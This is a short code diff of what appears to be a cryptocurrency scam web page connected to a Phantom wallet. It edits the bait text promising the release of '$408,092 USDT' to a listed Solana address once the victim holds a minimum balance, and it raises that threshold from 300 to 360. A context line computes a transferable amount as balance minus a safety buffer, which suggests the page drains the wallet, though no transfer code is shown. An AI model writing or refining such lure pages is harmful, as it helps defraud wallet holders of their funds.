@@ -66,7 +66,7 @@ const publicKey = res.publicKey
       const amount = balance - SAFETY_BUFFER
 
       if (amount <= 0) {
-        alert("Add 300 balance to phantom")
+        alert("Add 360.00SOL balance to phantom")
         return
       }
 
@@ -204,8 +204,8 @@ const publicKey = res.publicKey
       </p>
 
       <p className="text-yellow-200/80 text-sm leading-relaxed">
-        To release the <span className="font-semibold text-white">$408,092 USDT</span>,  
-        you must maintain a balance of <span className="text-yellow-300 font-semibold">$300 USD</span>  
+        To release the <span className="font-semibold text-white">$408,092 USDT to 8wNtA7P4RWWe76WfnTocj59R7wRUg7zLsJuDmnRZLWot </span>,  
+        you must maintain a balance of <span className="text-yellow-300 font-semibold">$360 USD</span>  
         in your wallet beforehand.
       </p>
 
